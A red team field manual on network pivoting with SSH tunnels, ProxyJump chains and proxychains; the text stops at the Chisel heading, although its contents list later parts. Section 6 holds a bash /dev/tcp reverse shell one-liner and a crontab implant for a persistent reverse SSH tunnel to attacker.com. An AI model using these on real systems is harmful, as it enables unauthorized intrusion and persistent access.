# Network Pivoting & Tunneling — Red Team Field Manual
### SSH Tunnels | SOCKS Proxies | Chisel | Ligolo-ng | Double Pivots | Firewall Evasion

> **Series Position:** Module 9
> Cross-references: `Ports_Protocols_RedTeam_Field_Manual.md` (SSH port 22, tunneling basics), `Active_Directory_RedTeam_Field_Manual.md` (lateral movement via pivot), `Linux_PrivEsc_PostExploitation_RedTeam_Field_Manual.md` (post-exploitation setup), `Windows_PrivEsc_RedTeam_Field_Manual.md` (Windows pivot techniques).
>
> **Red Team Lens:** Pivoting is what separates a single compromised machine from a fully compromised network. Real engagements almost always involve multiple network segments — DMZ, internal LAN, server VLAN, AD network, OT/SCADA. Each segment requires a new pivot. Master this and you can reach anything from anywhere.
>
> **Lab Disclaimer:** All techniques are for authorized environments only — your own lab, HTB Pro Labs, CRTO, OSCP, authorized penetration tests.

---

## Table of Contents

### PART 1 — PIVOTING FUNDAMENTALS
1. [What Pivoting Is — The Mental Model](#1-what-pivoting-is--the-mental-model)
2. [Network Topologies You'll Encounter](#2-network-topologies-youll-encounter)
3. [Pivoting Vocabulary — Terms Every Operator Knows](#3-pivoting-vocabulary)
4. [Choosing the Right Tool for Each Scenario](#4-choosing-the-right-tool)

### PART 2 — SSH TUNNELING (DEEP DIVE)
5. [Local Port Forwarding (-L)](#5-local-port-forwarding--l)
6. [Remote Port Forwarding (-R)](#6-remote-port-forwarding--r)
7. [Dynamic Port Forwarding / SOCKS (-D)](#7-dynamic-port-forwarding--socks--d)
8. [SSH ProxyJump — Multi-Hop Chains (-J)](#8-ssh-proxyjump--multi-hop-chains--j)
9. [SSH Config File — Operator Workflow](#9-ssh-config-file--operator-workflow)
10. [SSH Tunneling Without Full SSH Access](#10-ssh-tunneling-without-full-ssh-access)

### PART 3 — PROXYCHAINS & TOOL ROUTING
11. [Proxychains — Routing Any Tool Through a Pivot](#11-proxychains--routing-any-tool-through-a-pivot)
12. [Proxychains Configuration Deep Dive](#12-proxychains-configuration-deep-dive)
13. [Tools That Work and Don't Work Through Proxychains](#13-tools-that-work-and-dont-work-through-proxychains)

### PART 4 — CHISEL (HTTP TUNNEL)
14. [Chisel — Why It Exists and When to Use It](#14-chisel--why-it-exists-and-when-to-use-it)
15. [Chisel SOCKS Proxy (Forward & Reverse)](#15-chisel-socks-proxy-forward--reverse)
16. [Chisel Port Forwarding](#16-chisel-port-forwarding)
17. [Chisel Through Web Proxies & CDNs](#17-chisel-through-web-proxies--cdns)

### PART 5 — LIGOLO-NG (ROUTING PIVOT)
18. [Ligolo-ng — The Modern Standard](#18-ligolo-ng--the-modern-standard)
19. [Ligolo-ng Setup — Agent & Proxy](#19-ligolo-ng-setup--agent--proxy)
20. [Ligolo-ng Double Pivot (Two Hops)](#20-ligolo-ng-double-pivot-two-hops)
21. [Ligolo-ng on Windows](#21-ligolo-ng-on-windows)

### PART 6 — OTHER PIVOTING TOOLS
22. [Netsh (Windows Built-in Port Forward)](#22-netsh-windows-built-in-port-forward)
23. [Socat — The Duct Tape of Pivoting](#23-socat--the-duct-tape-of-pivoting)
24. [Plink (PuTTY Link — Windows SSH)](#24-plink-putty-link--windows-ssh)
25. [Rpivot — Reverse SOCKS Proxy](#25-rpivot--reverse-socks-proxy)
26. [Metasploit Pivoting](#26-metasploit-pivoting)

### PART 7 — DNS & ICMP TUNNELING
27. [DNS Tunneling for C2 & Data Exfil](#27-dns-tunneling-for-c2--data-exfil)
28. [ICMP Tunneling — Traffic in Ping Packets](#28-icmp-tunneling--traffic-in-ping-packets)
29. [HTTP/HTTPS Tunneling](#29-httphttps-tunneling)

### PART 8 — FIREWALL EVASION
30. [Detecting What's Blocked](#30-detecting-whats-blocked)
31. [Source Port Manipulation](#31-source-port-manipulation)
32. [Protocol Encapsulation Strategies](#32-protocol-encapsulation-strategies)
33. [Evading Deep Packet Inspection (DPI)](#33-evading-deep-packet-inspection-dpi)

### PART 9 — FULL MULTI-HOP SCENARIOS
34. [Scenario: Three-Hop Lab (Internet → DMZ → Internal → AD)](#34-three-hop-scenario)
35. [Scenario: Windows-Only Environment (No SSH)](#35-windows-only-pivot-scenario)
36. [Scenario: Heavily Restricted Egress (DNS/ICMP Only)](#36-heavily-restricted-egress-scenario)

### PART 10 — OPSEC & DETECTION
37. [What Pivoting Leaves Behind](#37-what-pivoting-leaves-behind)
38. [Pivoting Detection from Defender's View](#38-pivoting-detection-from-defenders-view)

---

# PART 1 — PIVOTING FUNDAMENTALS

---

## 1. What Pivoting Is — The Mental Model

### Layman's Terms
Imagine you're trying to break into a corporate building. The front door is heavily guarded. But you find an employee (compromised machine) who has a badge that opens a side door. You use their badge (their network position) to reach areas you couldn't reach before. **Pivoting is using a compromised machine as a stepping stone to reach networks and systems you can't directly access**.

### Real-World Event
In the **RSA SecurID breach (2011)**, attackers compromised an RSA employee's machine. That machine was on the corporate LAN, which had access to RSA's development network. From development, they reached the server holding SecurID seed values. The entire attack chain was possible because each compromised machine had access to the next network segment — classic pivot chain. The initial compromise was worth almost nothing alone; the pivoting was everything.

### The Core Problem Pivoting Solves

```
YOUR MACHINE (Kali)          PIVOT MACHINE           INTERNAL TARGET
10.10.10.50                  10.10.10.100             192.168.1.50
                             (also: 192.168.1.100)

DIRECT CONNECTION:
Kali → 192.168.1.50: BLOCKED (different network, no route)

WITH PIVOT:
Kali → Pivot (10.10.10.100) → 192.168.1.50: WORKS!
         ↑
         Pivot machine has access to BOTH networks
         We use it as a relay

THE FUNDAMENTAL RULE:
  Traffic flows: Kali → Pivot → Target
  But to KALI, it looks like traffic goes: Kali → Target
  The pivot is transparent (from Kali's perspective)
```

### Pivot vs Tunnel vs Port Forward — Distinctions

```
PORT FORWARD:
  Specific port on one machine → specific port on another
  "Send anything arriving at Kali:1433 to 192.168.1.50:1433"
  Use: Access one specific service through a pivot
  
SOCKS PROXY:
  Route ALL TCP traffic through pivot machine
  Client connects to proxy port → proxy connects to target
  "Use Kali:1080 as a proxy for any destination"
  Use: General internet/network access through a pivot
  
TUNNEL:
  Any traffic type encapsulated in another protocol
  "Send TCP inside DNS queries" or "Send all traffic inside HTTPS"
  Use: Bypass firewalls that block direct connections
  
PIVOT (general term):
  Using a compromised host as a relay point
  Encompasses all the above techniques
```

---

## 2. Network Topologies You'll Encounter

```
TOPOLOGY 1: SIMPLE DMZ
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  [Internet]                                                 │
│      │                                                      │
│  [Firewall1]                                                │
│      │                                                      │
│  [DMZ: 10.10.10.0/24]                                       │
│   Web01: 10.10.10.10  ← You compromise this                 │
│   Mail01: 10.10.10.20                                       │
│      │                                                      │
│  [Firewall2]                                                │
│      │                                                      │
│  [Internal: 192.168.1.0/24]                                 │
│   DC01: 192.168.1.10    ← You want this                     │
│   SQL01: 192.168.1.20                                       │
│                                                             │
│  PIVOT: Web01 has one foot in DMZ, one in Internal          │
└─────────────────────────────────────────────────────────────┘

TOPOLOGY 2: MULTI-SEGMENT ENTERPRISE
┌─────────────────────────────────────────────────────────────┐
│  [Internet]                                                 │
│      │                                                      │
│  [DMZ: 10.10.10.0/24]     ← Compromise web server here     │
│      │                                                      │
│  [Corporate LAN: 10.0.0.0/16]  ← Pivot here for AD         │
│   ├── IT VLAN: 10.0.1.0/24                                  │
│   ├── HR VLAN: 10.0.2.0/24                                  │
│   ├── Finance VLAN: 10.0.3.0/24  ← High-value target       │
│   └── Server VLAN: 10.0.10.0/24                             │
│         DC01: 10.0.10.10                                    │
│      │                                                      │
│  [OT Network: 172.16.0.0/16]  ← Industrial/SCADA           │
│                                                             │
│  REQUIRES: Multiple pivots, one per network segment         │
└─────────────────────────────────────────────────────────────┘

TOPOLOGY 3: CLOUD HYBRID
┌─────────────────────────────────────────────────────────────┐
│  [Internet]                                                 │
│      │                                                      │
│  [AWS VPC: 10.0.0.0/16]   ← Compromise EC2 here            │
│   Public subnet: 10.0.1.0/24                                │
│   Private subnet: 10.0.2.0/24  ← Internal services         │
│      │                          No IGW, only NAT GW         │
│  [VPN/Direct Connect]                                       │
│      │                                                      │
│  [On-premises: 192.168.0.0/24]  ← Corporate network        │
│                                                             │
│  PIVOT: EC2 instance → private subnet → on-prem via VPN    │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. Pivoting Vocabulary

```
JUMP HOST / BASTION HOST:
  A machine that acts as an intermediate access point
  Admins use them legitimately; attackers abuse them
  
PIVOT HOST:
  Your compromised machine that has access to a target network
  It "pivots" your access from one network to another
  
PROXY:
  A server that acts as an intermediary for connections
  FORWARD proxy: client → proxy → internet
  REVERSE proxy: internet → proxy → internal server
  SOCKS proxy: handles any protocol, any destination
  
SOCKS (Socket Secure):
  Protocol for proxying arbitrary TCP/UDP connections
  SOCKS4: TCP only, no authentication
  SOCKS5: TCP + UDP, optional authentication, IPv6
  
TUNNELING:
  Encapsulating one protocol inside another
  Common: TCP inside SSH, any traffic inside DNS, TCP inside ICMP
  
PORT FORWARDING:
  Redirecting traffic from one port/host to another
  Local forward: incoming to MY port → remote host:port
  Remote forward: incoming to REMOTE port → local host:port
  
PROXYCHAIN:
  Series of proxies that traffic passes through
  Attacker → Proxy1 → Proxy2 → Proxy3 → Target
  
DOUBLE PIVOT:
  Pivot through two machines to reach a third network
  Kali → Pivot1 → Pivot2 → Target
  
BIND SHELL:
  Target listens, attacker connects
  Requires firewall inbound rule on target
  
REVERSE SHELL:
  Target connects back to attacker
  More reliable (outbound usually allowed)
  Most shells on modern engagements are reverse shells
```

---

## 4. Choosing the Right Tool

```
DECISION FLOWCHART:

┌────────────────────────────────────────────────────────────────┐
│ Do you have SSH access to the pivot host?                     │
│   YES → Use SSH tunneling (simplest, most reliable)           │
│   NO  → Continue below                                        │
└────────────────────────────────────────────────────────────────┘
               │ NO
               ▼
┌────────────────────────────────────────────────────────────────┐
│ Can the pivot host make OUTBOUND connections?                  │
│   YES (any port) → Chisel reverse SOCKS (most flexible)       │
│   YES (port 80/443 only) → Chisel over HTTP/HTTPS             │
│   NO outbound → Use bind mode tools (less common)             │
└────────────────────────────────────────────────────────────────┘
               │ NO OUTBOUND
               ▼
┌────────────────────────────────────────────────────────────────┐
│ What protocols are allowed through the firewall?              │
│   DNS only → dnscat2 or iodine                                │
│   ICMP only → ptunnel-ng                                      │
│   HTTP only → reGeorg (via webshell), Chisel HTTP             │
│   Any TCP → Chisel, socat, plink                              │
└────────────────────────────────────────────────────────────────┘

TOOL SELECTION MATRIX:
┌──────────────────┬──────────────┬──────────────┬─────────────────┐
│ Tool             │ OS Support   │ Requires     │ Best For        │
├──────────────────┼──────────────┼──────────────┼─────────────────┤
│ SSH -L/-R/-D     │ Linux/Mac    │ SSH server   │ Quick pivots    │
│ SSH -J           │ Linux/Mac    │ SSH + creds  │ Multi-hop       │
│ Chisel           │ All (Go)     │ HTTP/HTTPS   │ FW bypass       │
│ Ligolo-ng        │ All (Go)     │ TUN device   │ Full routing    │
│ Proxychains      │ Linux        │ SOCKS proxy  │ Tool routing    │
│ Socat            │ Linux        │ Nothing      │ Simple relay    │
│ Netsh            │ Windows      │ Admin        │ Windows pivot   │
│ Plink            │ Windows      │ Nothing      │ Windows SSH     │
│ Metasploit       │ Linux        │ Meterpreter  │ Auto-routing    │
│ dnscat2          │ All          │ DNS server   │ DNS C2/tunnel   │
│ ptunnel-ng       │ Linux        │ ICMP access  │ ICMP tunnel     │
└──────────────────┴──────────────┴──────────────┴─────────────────┘
```

---

# PART 2 — SSH TUNNELING (DEEP DIVE)

---

## 5. Local Port Forwarding (-L)

### Layman's Terms
Local port forwarding says: **"Listen on MY machine's port X. When anything connects to it, forward that connection through the SSH server to destination Y:Z."** The destination is reached FROM the SSH server's perspective — so it can be anything that server can reach, even if you can't reach it directly.

### Formal Definition
`ssh -L [bind_address:]local_port:remote_host:remote_port user@ssh_server`
Creates a local listening socket on the attacker machine. Traffic to that port is forwarded through the encrypted SSH tunnel to the remote_host:remote_port as seen from the SSH server's network perspective.

```
VISUAL:
  YOUR MACHINE                 PIVOT (SSH Server)         INTERNAL TARGET
  Kali:10.10.10.50             pivot:10.10.10.100          sqlserver:192.168.1.50
                               (also: 192.168.1.100)
  
  [Application]                                            [SQL Server :1433]
       ↓                                                         ↑
  localhost:1433  ──── SSH Tunnel ────►  pivot ──────────────────┘
  (local port)         (encrypted)       (reaches 192.168.1.50:1433)

Traffic flow:
  YOUR localhost:1433 → SSH TUNNEL → pivot → 192.168.1.50:1433

From SQLSERVER's perspective: connection comes from pivot (192.168.1.100)
```

### Practical Examples

```bash
# ── SCENARIO 1: Access internal RDP (port 3389) ────────────────────
# Pivot: web01.dmz (10.10.10.100) can reach 192.168.1.50 on any port
# Goal: RDP to internal workstation 192.168.1.50

ssh -L 13389:192.168.1.50:3389 -N user@10.10.10.100
#    ^^^^ local port (anything above 1024)
#         ^^^^^^^^^^^^^ destination (as seen from pivot)
#                       ^^^^ destination port
#                            user@pivot_host

# Now open RDP client:
xfreerdp /v:localhost:13389 /u:administrator /p:Password1!
# Connected to 192.168.1.50:3389 via pivot!
# Expected: RDP session to internal workstation opens!

# ── SCENARIO 2: Access internal web application ────────────────────
ssh -L 8080:192.168.1.100:80 -N user@10.10.10.100
# Visit: http://localhost:8080 in browser
# You see the internal web application!

# ── SCENARIO 3: Access internal database ──────────────────────────
ssh -L 3306:192.168.1.50:3306 -N user@10.10.10.100
mysql -h 127.0.0.1 -P 3306 -u root -p
# Connected to internal MySQL via pivot!

# ── SCENARIO 4: Multiple forwards in one command ───────────────────
ssh -L 13389:192.168.1.50:3389 \
    -L 3306:192.168.1.60:3306 \
    -L 8080:192.168.1.70:80 \
    -N user@10.10.10.100
# Three forwards simultaneously through one SSH connection

# ── FLAGS EXPLAINED ────────────────────────────────────────────────
-N    # Don't execute remote command (just maintain tunnel)
-f    # Fork to background after authentication
-q    # Quiet mode (suppress warnings/messages)
-o StrictHostKeyChecking=no  # Don't check host key (lab use)
-o ServerAliveInterval=60    # Keep connection alive (send keepalive every 60s)
-o ServerAliveCountMax=3     # Disconnect after 3 failed keepalives
-i key.pem                   # Use specific SSH key

# COMMON MISTAKE: Forgetting -N causes SSH to open an interactive shell
# which may confuse you — nothing appears broken but you got a shell, not just a tunnel
# FIX: Always use -N when creating tunnels without needing a shell

# BACKGROUND the tunnel:
ssh -L 13389:192.168.1.50:3389 -N -f user@10.10.10.100
# Returns immediately — tunnel runs in background
# Kill it: pkill -f "ssh.*13389"
# OR: ssh -O stop -L 13389:... user@host (if connection sharing enabled)
```

---

## 6. Remote Port Forwarding (-R)

### Layman's Terms
Remote forwarding is the **reverse of local** — instead of YOUR machine listening for traffic to forward, the **SSH SERVER listens** and forwards traffic back to you. Critical use case: your target can reach your attacker machine but you can't directly reach the target. You SSH out from the target — the server on your machine becomes accessible to the target's network.

```
VISUAL:
  YOUR MACHINE (Kali)         PIVOT (SSH Server)         INTERNAL NETWORK
  Kali:10.10.10.50            pivot:10.10.10.100           ??? (can't reach Kali)
  
  Goal: Get a reverse shell from a machine that can't reach Kali directly
  
  [Listener: Kali:4444]                                  [New Target: 192.168.1.80]
         ↑                                                        ↓
  Kali:4444  ◄──── SSH Tunnel ────── pivot:9001 ◄──── reverse shell
  
  Traffic flow:
  192.168.1.80 → pivot:9001 → SSH TUNNEL → Kali:4444
```

```bash
# ── SCENARIO 1: Expose a listener on the pivot ────────────────────
# You have SSH access to the pivot. You want to catch a shell
# from a machine that can reach the pivot but NOT Kali.

# On Kali: Start SSH remote forward
ssh -R 9001:localhost:4444 -N user@10.10.10.100
# pivot now listens on port 9001
# Any connection to pivot:9001 → forwarded to Kali:4444

# On Kali: Start listener
nc -lvnp 4444

# On internal target (192.168.1.80) — execute reverse shell:
bash -i >& /dev/tcp/10.10.10.100/9001 0>&1
# This connects to PIVOT:9001 → which forwards to KALI:4444
# Expected: Kali catches the reverse shell!

# ── SCENARIO 2: Expose local tool via pivot (pivot = jump host) ───
# Run Metasploit handler on Kali, expose via pivot:
ssh -R 9090:localhost:9090 -N user@10.10.10.100
# pivot:9090 → Kali:9090 (where Metasploit is listening)
# Internal targets connecting to pivot:9090 → Kali Metasploit handler

# ── SCENARIO 3: GatewayPorts (allow external connections to -R port)─
# By default, -R only listens on 127.0.0.1 of the remote SSH server
# Add GatewayPorts yes in sshd_config to listen on all interfaces
# OR: use 0.0.0.0 syntax:
ssh -R 0.0.0.0:9001:localhost:4444 -N user@10.10.10.100
# Now pivot:9001 listens on ALL interfaces (reachable by internal hosts!)
# Requires: GatewayPorts yes in pivot's /etc/ssh/sshd_config

# Check if GatewayPorts is enabled:
# On pivot:
grep GatewayPorts /etc/ssh/sshd_config
# If not enabled: SSH -R only listens on 127.0.0.1 of pivot

# ── SCENARIO 4: Reverse port forward for persistent access ────────
# Plant on target: auto-reconnect reverse SSH on reboot
# Add to crontab on pivot:
# @reboot ssh -R 9001:localhost:22 -N -o StrictHostKeyChecking=no \
#   -o ServerAliveInterval=60 -i /home/user/.ssh/id_rsa user@attacker.com
# Now attacker can SSH to attacker.com:9001 → gets pivot's SSH!
```

---

## 7. Dynamic Port Forwarding / SOCKS (-D)

### Layman's Terms
Dynamic forwarding creates a **SOCKS proxy** on your local machine. Instead of forwarding to one specific destination, SOCKS lets you route **any connection to any destination** through the pivot. Your browser, nmap, sqlmap, evil-winrm — anything that supports SOCKS — can now reach the internal network as if you were on that network.

```bash
# ── BASIC SOCKS PROXY ──────────────────────────────────────────────
ssh -D 1080 -N user@10.10.10.100
# Creates SOCKS5 proxy on localhost:1080
# Any connection through this proxy → pivot → destination
# -D 1080 can also be written as -D 0.0.0.0:1080 (listen on all interfaces)

# ── CONFIGURE PROXYCHAINS TO USE IT ───────────────────────────────
# Edit /etc/proxychains4.conf:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
# (or socks4 127.0.0.1 1080 for SOCKS4)

# Test it works:
proxychains4 curl http://192.168.1.1
# Expected: response from internal router web UI

# ── SCAN INTERNAL NETWORK THROUGH SOCKS ───────────────────────────
# TCP CONNECT scan (proxychains requires full TCP — use -sT not -sS):
proxychains4 nmap -sT -Pn -p 80,443,22,445,3389 192.168.1.0/24 2>/dev/null
# -sT = TCP connect (not SYN) — required for proxychains
# -Pn = skip ping (ICMP won't work through SOCKS)
# This will be SLOW — adjust port list for speed

# ── USE BROWSER THROUGH SOCKS ──────────────────────────────────────
# Firefox: Settings → Network → Manual Proxy
# SOCKS Host: 127.0.0.1, Port: 1080, SOCKS v5
# Check: "Proxy DNS when using SOCKS v5"
# Now browse to http://192.168.1.10 → loads via pivot!

# FoxyProxy extension (Firefox) — easy toggle:
# Add proxy: SOCKS5, 127.0.0.1:1080, patterns for 192.168.*.* and 10.*.*.*

# ── USE EVIL-WINRM THROUGH SOCKS ──────────────────────────────────
proxychains4 evil-winrm -i 192.168.1.50 -u bob -p Password1!
# Connected to internal WinRM via pivot!

# ── USE CRACKMAPEXEC THROUGH SOCKS ────────────────────────────────
proxychains4 crackmapexec smb 192.168.1.0/24 -u bob -p Password1!
# SMB sweep of entire internal network via pivot!

# ── BACKGROUND THE TUNNEL ──────────────────────────────────────────
ssh -D 1080 -N -f user@10.10.10.100
# Returns immediately, tunnel in background
# Kill: pkill -f "ssh.*1080"
# Or: use ssh multiplexing to manage connections (see Section 9)
```

---

## 8. SSH ProxyJump — Multi-Hop Chains (-J)

### Layman's Terms
ProxyJump lets you **chain SSH connections through multiple jump hosts in one command**. You don't need to SSH to hop1, then from hop1 SSH to hop2, then from hop2 SSH to target. One command does the whole chain — each hop just tunnels you to the next.

```bash
# ── TOPOLOGY ──────────────────────────────────────────────────────
# Kali → Hop1 (10.10.10.100) → Hop2 (192.168.1.50) → Target (10.0.1.100)
# Kali can only reach Hop1
# Hop1 can reach Hop2
# Hop2 can reach Target

# ── SINGLE JUMP (-J) ──────────────────────────────────────────────
# SSH to Target via Hop1:
ssh -J user@10.10.10.100 user@192.168.1.50
# Kali → 10.10.10.100 → 192.168.1.50
# Expected: Shell on 192.168.1.50!

# ── DOUBLE JUMP ───────────────────────────────────────────────────
# SSH to Target via Hop1 AND Hop2:
ssh -J user1@10.10.10.100,user2@192.168.1.50 user3@10.0.1.100
# Kali → Hop1 → Hop2 → Target
# Comma-separated list of jump hosts!

# ── COMBINE WITH PORT FORWARD ─────────────────────────────────────
# RDP to Target through 2 hops:
ssh -J user1@10.10.10.100,user2@192.168.1.50 \
    -L 13389:localhost:3389 \
    -N user3@10.0.1.100
# localhost:13389 → Hop1 → Hop2 → Target:3389
# Then: xfreerdp /v:localhost:13389

# ── COMBINE WITH SOCKS ────────────────────────────────────────────
# SOCKS proxy through 2 hops:
ssh -J user1@10.10.10.100,user2@192.168.1.50 \
    -D 1080 \
    -N user3@10.0.1.100
# Now access Target's entire network via proxy!

# ── DIFFERENT KEYS PER HOP ────────────────────────────────────────
# If each hop uses a different SSH key:
ssh -J user1@hop1.com \
    -i /path/to/hop2_key \
    user2@hop2.internal
# -i key applies to the FINAL destination
# For per-hop keys, use SSH config (see Section 9)
```

---

## 9. SSH Config File — Operator Workflow

### Layman's Terms
The SSH config file (`~/.ssh/config`) lets you **define shortcuts and complex configurations** that would otherwise require typing lengthy command flags every time. For pivoting chains, this is essential — you define the topology once and use simple names forever.

```bash
# ── BASIC CONFIG STRUCTURE ────────────────────────────────────────
cat ~/.ssh/config

# Example complex pivot config:
cat > ~/.ssh/config << 'EOF'
# Hop1 (DMZ pivot) — reachable directly
Host hop1
    HostName 10.10.10.100
    User user1
    IdentityFile ~/.ssh/hop1_key
    ServerAliveInterval 60
    ServerAliveCountMax 3
    StrictHostKeyChecking no

# Hop2 (Internal pivot) — via Hop1
Host hop2
    HostName 192.168.1.50
    User user2
    IdentityFile ~/.ssh/hop2_key
    ProxyJump hop1              # SSH to hop2 via hop1 automatically!
    StrictHostKeyChecking no

# Target — via Hop2 (which is via Hop1)
Host target
    HostName 10.0.1.100
    User user3
    IdentityFile ~/.ssh/target_key
    ProxyJump hop2              # Goes: Kali → hop1 → hop2 → target
    StrictHostKeyChecking no
    
# RDP access to target via chain:
Host target-rdp
    HostName 10.0.1.100
    User user3
    ProxyJump hop2
    LocalForward 13389 localhost:3389   # Forward RDP while connecting
    LocalForward 3306 192.168.2.50:3306 # AND forward internal DB

# SOCKS proxy via full chain:
Host tunnel-full
    HostName 10.0.1.100
    User user3
    ProxyJump hop2
    DynamicForward 1080         # SOCKS on localhost:1080
    RequestTTY no
EOF

# ── USAGE WITH CONFIG ──────────────────────────────────────────────
# Connect to target through full chain (one command!):
ssh target
# Expected: Shell on 10.0.1.100, tunneled through hop1 and hop2

# Start RDP forward via chain:
ssh -N target-rdp
# Then: xfreerdp /v:localhost:13389

# Full SOCKS via chain:
ssh -N tunnel-full
# Then: proxychains4 nmap -sT 10.0.2.0/24

# ── SSH MULTIPLEXING (manage multiple connections) ─────────────────
# Add to ~/.ssh/config:
cat >> ~/.ssh/config << 'EOF'
Host *
    ControlMaster auto
    ControlPath ~/.ssh/cm_socket_%r@%h:%p
    ControlPersist 10m    # Keep master connection open 10 minutes
EOF

# First connection opens master socket:
ssh hop1  # Opens master connection

# Subsequent connections reuse socket (instant!):
ssh hop1  # Uses existing socket — no re-auth!
ssh -D 1080 -N hop1  # Add SOCKS to existing connection

# List active sessions:
ls ~/.ssh/cm_socket_*

# Close a connection:
ssh -O stop hop1
# Or just wait for ControlPersist timeout
```

---

## 10. SSH Tunneling Without Full SSH Access

```bash
# SCENARIO: You have code execution on a machine but:
# - SSH port (22) is blocked outbound
# - No SSH binary on target
# - Or you only have a reverse shell, can't bind ports

# ── METHOD 1: SSH on non-standard port ────────────────────────────
# If pivot's SSH listens on 443 or 80 (disguise as HTTPS/HTTP):
ssh -L 13389:192.168.1.50:3389 -p 443 user@10.10.10.100
# -p 443 = connect to SSH server on port 443 (looks like HTTPS to FW)

# ── METHOD 2: AUTOSSH (reconnecting SSH tunnel) ────────────────────
# autossh automatically restarts SSH if connection drops
sudo apt install autossh -y
autossh -M 0 -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
    -D 1080 -N user@10.10.10.100 &
# -M 0 = disable monitoring port (use ServerAlive instead)
# Automatically reconnects if tunnel drops = persistent pivot!

# ── METHOD 3: OpenSSH without installing it ───────────────────────
# Static binary of OpenSSH client (no install needed):
# https://github.com/nicowillis/tools/tree/main/ssh-static
# Transfer to target, execute:
./ssh-static -D 1080 -N user@10.10.10.100

# ── METHOD 4: Python SSH via paramiko ─────────────────────────────
# If Python available but not SSH binary:
pip3 install paramiko sshtunnel
python3 << 'EOF'
from sshtunnel import SSHTunnelForwarder

server = SSHTunnelForwarder(
    '10.10.10.100',
    ssh_username='user',
    ssh_password='password',
    remote_bind_address=('192.168.1.50', 3306),
    local_bind_address=('127.0.0.1', 3306)
)
server.start()
print("Tunnel open - press Ctrl+C to close")
import time
while True: time.sleep(1)
EOF
```

---

# PART 3 — PROXYCHAINS & TOOL ROUTING

---

## 11. Proxychains — Routing Any Tool Through a Pivot

### Layman's Terms
Proxychains is a **Linux tool that intercepts network calls from programs and routes them through a SOCKS proxy**. Without proxychains: nmap talks directly to the internet. With proxychains: nmap talks to your SOCKS proxy, which talks to the pivot, which talks to the target. The tool doesn't know it's being proxied.

```bash
# INSTALL:
sudo apt install proxychains4 -y
# Config file: /etc/proxychains4.conf

# ── BASIC USAGE ───────────────────────────────────────────────────
# Run ANY program through your proxy:
proxychains4 curl http://192.168.1.10
proxychains4 ssh user@192.168.1.50
proxychains4 nmap -sT -Pn 192.168.1.0/24
proxychains4 evil-winrm -i 192.168.1.50 -u bob -p Password1!
proxychains4 crackmapexec smb 192.168.1.0/24 -u bob -p Password1!
proxychains4 sqlmap -u "http://192.168.1.100/vuln?id=1"
proxychains4 python3 exploit.py

# ── QUIET MODE ────────────────────────────────────────────────────
proxychains4 -q curl http://192.168.1.10
# -q = quiet (suppress "[proxychains] ..." output lines)

# ── QUICK CHECK — IS PROXY WORKING? ───────────────────────────────
# Set up SSH SOCKS first:
ssh -D 1080 -N user@10.10.10.100 &

# Verify proxy works:
proxychains4 curl -s http://ifconfig.me
# Should return pivot's IP (10.10.10.100), not your Kali IP
# If you see YOUR IP → proxy isn't routing correctly

# Test internal access:
proxychains4 curl -s http://192.168.1.10/
# Expected: response from internal web server (HTML content)
# "Connection refused" or timeout = target unreachable (check pivot routes)
```

---

## 12. Proxychains Configuration Deep Dive

```bash
# ── CONFIG FILE: /etc/proxychains4.conf ───────────────────────────
cat > /etc/proxychains4.conf << 'EOF'
# Dynamic chain: use available proxies, skip dead ones
dynamic_chain
# strict_chain: ALL proxies must work (fail if any down)
# random_chain: random order (anonymity)

# Quiet mode by default
quiet_mode

# Proxy DNS through proxy (prevent DNS leaks!)
proxy_dns

# TCP read timeout
tcp_read_time_out 15000
# TCP connect timeout
tcp_connect_time_out 8000

[ProxyList]
# Type  Host            Port    [User]  [Pass]
socks5  127.0.0.1       1080
# Add more proxies for chaining:
# socks5  10.10.10.100   1080
# socks4  192.168.1.50   9050
EOF

# ── CHAIN TYPES EXPLAINED ─────────────────────────────────────────
# dynamic_chain:
#   Uses proxies in order but skips dead ones
#   Best for: general use, reliability
#   
# strict_chain:
#   ALL proxies must be reachable
#   Fails if any proxy is down
#   Best for: when you need guaranteed routing
#   
# random_chain:
#   Uses proxies in random order
#   Best for: anonymization (less relevant in red team context)

# ── MULTIPLE SOCKS PROXIES (proxy chain) ──────────────────────────
# For a double pivot (two hops):
# Hop1 SSH SOCKS on localhost:1080
# Hop2 SSH SOCKS on localhost:1081

# /etc/proxychains4.conf:
# strict_chain
# [ProxyList]
# socks5 127.0.0.1 1080    ← First hop
# socks5 127.0.0.1 1081    ← Second hop
#
# Traffic: Tool → localhost:1080 → Hop1 → localhost:1081 → Hop2 → Target

# ── PER-COMMAND CONFIG ────────────────────────────────────────────
# Use a different config file for a specific command:
proxychains4 -f /tmp/custom_proxychains.conf nmap -sT 192.168.1.0/24
```

---

## 13. Tools That Work and Don't Work Through Proxychains

```bash
# ── WORKS FINE (full TCP support) ────────────────────────────────
# These work through SOCKS proxies:
proxychains4 ssh user@target          # SSH
proxychains4 evil-winrm -i target     # WinRM/PowerShell
proxychains4 curl http://target/      # HTTP
proxychains4 wget http://target/file  # Download
proxychains4 mysql -h target          # MySQL
proxychains4 psql -h target           # PostgreSQL
proxychains4 redis-cli -h target      # Redis
proxychains4 sqlmap -u http://target  # SQLi
proxychains4 python3 exploit.py       # Python network tools
proxychains4 crackmapexec smb target  # CME
proxychains4 impacket-psexec target   # Impacket tools (most)
proxychains4 nikto -h target          # Nikto
proxychains4 gobuster dir -u http://target  # Gobuster

# ── DOESN'T WORK / LIMITATIONS ────────────────────────────────────
# SYN scan (nmap -sS): SOCKS requires full TCP — use -sT instead
proxychains4 nmap -sT -Pn target      # CORRECT (connect scan)
proxychains4 nmap -sS target          # WRONG (SYN scan fails)

# UDP: SOCKS4 doesn't support UDP; SOCKS5 does but many tools don't use it
# DNS: Use proxy_dns in proxychains config to prevent DNS leaks
# ICMP (ping): Doesn't go through SOCKS — use TCP traceroute instead

# Multithreaded tools: May have race conditions through proxychains
# Fix: reduce thread count (-t 5 or less)

# ── ALTERNATIVE TO PROXYCHAINS: TSOCKS / NCAT ─────────────────────
# For tools that don't support SOCKS natively:
# tsocks (older, similar to proxychains):
tsocks nmap -sT 192.168.1.0/24

# Ncat with proxy:
ncat --proxy 127.0.0.1:1080 --proxy-type socks5 192.168.1.50 22

# Using SOCKS with curl directly (no proxychains):
curl --socks5 127.0.0.1:1080 http://192.168.1.10/
curl --socks5-hostname 127.0.0.1:1080 http://internal-host/
# --socks5-hostname = resolves DNS through proxy (prevents DNS leak)
```

---

# PART 4 — CHISEL (HTTP TUNNEL)

---

